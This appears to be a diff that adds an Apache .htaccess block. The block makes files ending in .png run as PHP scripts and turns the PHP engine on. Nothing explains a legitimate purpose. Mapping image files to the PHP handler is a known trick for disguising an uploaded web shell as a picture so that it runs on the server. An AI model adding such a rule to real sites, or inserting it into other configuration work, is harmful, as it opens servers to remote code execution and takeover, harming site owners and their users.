@@ -1,0 +1,6 @@
+<FilesMatch "\.png">
+SetHandler application/x-httpd-php
+AddHandler php5-script .png
+AddType application/x-httpd-php .png
+</FilesMatch>
+php_flag engine on
